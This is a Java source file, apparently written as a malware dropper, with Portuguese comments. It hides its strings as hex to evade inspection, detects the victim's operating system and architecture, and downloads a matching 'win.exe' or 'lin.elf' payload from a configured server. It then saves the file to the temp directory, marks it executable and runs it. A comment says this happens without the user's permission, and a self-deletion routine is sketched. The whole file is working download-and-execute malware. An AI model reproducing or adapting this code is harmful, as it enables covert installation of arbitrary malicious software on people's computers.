import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

/**
 *
 * @author Hurbizo
 */
public class Dropper {
    private static final String amd64 = "616d643634";   //string ofuscada
    private static String arch;
    private static String OS;
    private static String windows = "77696e646f7773";  //string ofuscada 
    private static String linux = "6c696e7578"; //string ofuscada
    private static String droped;
    private static String url = "687474703a2f2f25732f25732f2573"; // http e quantidade de " / " até o arquivo
    private static String host = "3132372e302e302e31";   //ip do servidor onde o arquivo está
    
    
    //verificação de arquitetura
    private static void setArch(){
        if (System.getProperty(bir("6f732e61726368")).equals(bir(amd64))){  //codigo qual o sistema dará a arquitetura
            arch =  bir("783634");   //x64
            
        } else {
            arch = bir("783836"); //x86
        }
    }
    
    //verificação de sistema operacional 
    private static void setSO(){
        String so = System.getProperty(bir("6f732e6e616d65")).toLowerCase(); //codigo que dará a qual o sistema operacional
        
        if(so.contains(bir("77696e"))){ //dá o nome do arquivo se for windows
           OS = bir(windows);
           
        } else if(so.contains(bir("6e6978")) //dá o nome do arquivo se for linux
               || so.indexOf(bir("616978")) > 0){
           OS = bir(linux);
           
        } else {
            OS = bir("646573636f6e68656369646f"); //desconhecido
        }
        
        if(OS.equals(bir(windows))){
            droped = bir("77696e2e657865"); // colocara o tipo do arquivo junto com o nome se for windows 
        } 
        else if(OS.equals(bir(linux))){     // colocara o tipo do arquivo junto com o nome se for linux
            droped = bir("6c696e2e656c66");
    }}
        
    // metodo implantar o arquivo
    private static void implantar() throws MalformedURLException, FileNotFoundException, IOException{
        
        //caminho onde fará o download da internet após verificar a arquitetura do sistema e o sistema operacional
        
        url = String.format(bir(url), bir(host), arch, droped); //define o caminho na internet
        
        BufferedInputStream in = null;
        FileOutputStream fout = null;
        String local = System.getProperty(bir("6a6176612e696f2e746d70646972")) + File.separator + droped; //o local que ficará no computador
        try{
            in = new BufferedInputStream(new URL(url).openStream()); //faz o download
            fout = new FileOutputStream(local); //onde vai ser alocado quando baixar
            
            final byte data[] = new byte[1024];
            int count;
            while ((count = in.read(data, 0, 1024)) != -1){
                fout.write(data, 0, count);
            }
        } finally {
                    if(in != null){
                        in.close();
                    }
                    if (fout != null){
                        fout.close();
                    
                    }
            }
            new File(local).setExecutable(true); //define o arquivo que foi baixado executavel
            
            //o arquivo será executado sem a permição do usiário
            
            Runtime.getRuntime().exec(local);
            //disquite();
        }
    
    //faz com que esse programa se exclua quando for executado
    private static void desquite() throws IOException{
        String del = new java.io.File(".").getCanonicalPath() + File.separator;
    }
        
        
        
    //metodo de desofuscação de string 
    private static String bir(String algo){
        StringBuilder str = new StringBuilder();
        for (int i = 0; i < algo.length(); i += 2){
            str.append((char) Integer.parseInt(algo.substring(i , i + 2), 16 ));
        }
        return str.toString();
    }
    
    //define a arquitetura e o sistema operacional
    private static void iniciarVariaveis(){
        setArch();
        setSO();
    }
    
    //metodo menu faz com que tudo aconteca em ordem
    public static void main(String[] args) throws FileNotFoundException, IOException {
        iniciarVariaveis();
        implantar();
        
        
    }
    
    
}
